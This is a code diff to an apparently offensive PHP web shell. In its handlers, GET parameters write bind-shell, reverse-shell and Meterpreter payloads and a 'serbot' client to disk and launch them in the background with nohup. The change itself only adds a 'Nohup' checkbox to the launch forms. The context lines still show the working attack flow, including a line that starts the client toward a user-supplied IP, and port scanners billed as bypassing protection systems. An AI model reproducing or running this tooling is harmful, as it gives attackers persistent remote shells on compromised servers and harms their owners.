@@ -3520,7 +3520,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bps"))
 	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $phpbindshell);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
 		if(evalRel($command)=="False")
@@ -3566,7 +3566,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rps"))
 	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $phpreverseshell);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
 		if(evalRel($command)=="False")
@@ -3610,7 +3610,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bmps"))
 	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $meterpreterbindshell);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
 		if(evalRel($command)=="False")
@@ -3655,7 +3655,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rmps"))
 	$filename = $writeread_dir .rand(1,1000) . ".php";
 
 	file_put_contents($filename, $meterpreterreverseshell);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
 		if(evalRel($command)=="False")
@@ -3698,7 +3698,7 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "sc"))
 	$filename = $writeread_dir .rand(1,1000) . ".py";
 
 	file_put_contents($filename, $serbotclient);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup python '$filename' ".$_POST['ip']." $port> /dev/null 2>&1 &";
 		evalRel($command);
@@ -3729,7 +3729,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscan"))
 	}
 
 	file_put_contents($filename, $bpscan);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup python '$filename' > /dev/null 2>&1 &";
 		evalRel($command);
@@ -3761,7 +3761,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 	}
 
 	file_put_contents($filename, $bpscanp);
-	if ($nohup == True)
+	if (($nohup == True) && (isset($_POST["nohup"])))
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
 		if(evalRel($command)=="False")
@@ -3798,7 +3798,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 			</tr>
 			<tr>
 				<td></td>
-				<td><input type='submit' value='Start' name='Start'/></td>
+				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
 			</tr>
 		</form>
 </table>
@@ -3819,7 +3819,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 			</tr>
 			<tr>
 				<td></td>
-				<td><input type='submit' value='Start' name='Start'/></td>
+				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
 			</tr>
 		</form>
 </table>
@@ -3836,7 +3836,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 			</tr>
 			<tr>
 				<td></td>
-				<td><input type='submit' value='Start' name='Start'/></td>
+				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
 			</tr>
 		</form>
 </table>
@@ -3857,7 +3857,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 			</tr>
 			<tr>
 				<td></td>
-				<td><input type='submit' value='Start' name='Start'/></td>
+				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
 			</tr>
 		</form>
 </table>
@@ -3883,7 +3883,7 @@ echo "
 			</tr>
 			<tr>
 				<td></td>
-				<td><input type='submit' value='Start' name='Start'/></td>
+				<td><input type='submit' value='Start' name='Start'/> <input type='checkbox' name='nohup' value='nohup'>Nohup</td>
 			</tr>
 		</form>
 </table>";
@@ -3912,7 +3912,7 @@ if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec 
 			<td>dotcppfile</td>
 			<td>Find useable/unblocked ports.</td>
 			<td>bpscan uses basic python socket binding with the service offered by yougetsignal.com to find useable/unblocked ports. The outputs are 'bpscan - errors.txt' and `bpscan - ports.txt' which will hold the found useable/unblocked ports. It uses 25 threads at a time but gets the job done so bare with it.</td>
-			<td><input type='submit' value='Start' name='Start'/></td>
+			<td><input type='submit' value='Start' name='Start'/> <input type='checkbox' name='nohup' value='nohup'>Nohup</td>
 		</tr>
 	</form>";
 }
@@ -3925,7 +3925,7 @@ echo "
 			<td>dotcppfile & Aces</td>
 			<td>Find useable/unblocked ports.</td>
 			<td>Same as `bpscan` but it's coded in PHP and uses 1 thread. It's also capable of bypassing Protection Systems.</td>
-			<td><input type='submit' value='Start' name='Start'/></td>
+			<td><input type='submit' value='Start' name='Start'/> <input type='checkbox' name='nohup' value='nohup'>Nohup</td>
 		</tr>
 	</form>
 </table>";
